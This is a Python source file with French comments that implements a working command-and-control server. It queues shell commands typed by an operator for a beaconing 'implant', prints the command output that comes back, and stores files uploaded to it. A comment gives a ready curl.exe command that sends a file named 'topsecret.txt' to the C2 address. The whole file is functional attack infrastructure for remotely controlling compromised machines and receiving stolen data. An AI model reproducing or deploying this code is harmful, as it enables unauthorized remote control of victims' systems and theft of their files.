import json
from http.server import BaseHTTPRequestHandler, HTTPServer
import os

# État global : pour chaque session, la commande à envoyer au prochain beacon
# Exemple : {"a1b2c3d4": "whoami"}
pending_commands = {}

# File d'attente
command_queue = []

# commandes utiles
# curl.exe -X POST "http://10.84.107.141:8000/"  -H "Content-Type: application/octet-stream"  -H "X-Filename: topsecret.txt"  --data-binary "@topsecret.txt"
# C2_URL = "http://10.84.107.141:8000"


class Handler(BaseHTTPRequestHandler):

    def do_POST(self):
        # --- 1. Lire le corps de la requête ---
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length)
        
        # Vérification des headers pour savoir si c'est un fichier
        filename = self.headers.get('X-Filename')
        content_type = self.headers.get('Content-Type', '')

        if filename or content_type == 'application/octet-stream':
            # --- CAS 1 : fichier ---
            safe_name = os.path.basename(filename) if filename else 'upload.bin'
            with open(safe_name, 'wb') as f:
                f.write(raw)

            self.send_response(200)
            self.end_headers()
            self.wfile.write(f"Fichier '{safe_name}' enregistre avec succes.\n".encode())
            print(f"[+] Fichier enregistre : {safe_name} ({length} octets)")

        else:
            # --- CAS 2 : autre ---
            try:
                data = json.loads(raw)
            except json.JSONDecodeError:
                self._reply(400, {"error": "bad json"})
                return

           # sid = data.get("sid", "unknown")
            output = data.get("output", "")

            # --- 2. Afficher le résultat reçu ---
            if output:
                # print(f"\n[{sid}] >>> {output}")
                print(f"\n>>> {output}")
        
        # --- 3. Déterminer la commande à envoyer ---
        # Si une commande attend pour cette session, on la prend.
        # Sinon, on pioche dans la file globale (si non vide).
        # if sid in pending_commands and pending_commands[sid]:
        #     cmd = pending_commands[sid].pop(0)
        if command_queue:
            cmd = command_queue.pop(0)
        else:
            cmd = ""  # rien à faire, l'implant va juste beaconer

        # --- 4. Répondre ---
        self._reply(200, {"cmd": cmd})

    def _reply(self, code, payload):
        body = json.dumps(payload).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def main():
    server = HTTPServer(("0.0.0.0", 8000), Handler)
    print("[*] C2 en écoute sur 0.0.0.0:8000")
    print("[*] Tape une commande + Entrée pour l'envoyer au prochain beacon.")
    print("[*] Ctrl+C pour quitter.\n")

    # Thread séparé pour lire les commandes au clavier
    import threading

    def input_loop():
        while True:
            try:
                cmd = input()
            except EOFError:
                break
            if cmd.strip():
                command_queue.append(cmd.strip())
                print(f"[*] Commande en file : {cmd.strip()}")

    threading.Thread(target=input_loop, daemon=True).start()
    server.serve_forever()


if __name__ == "__main__":
    main()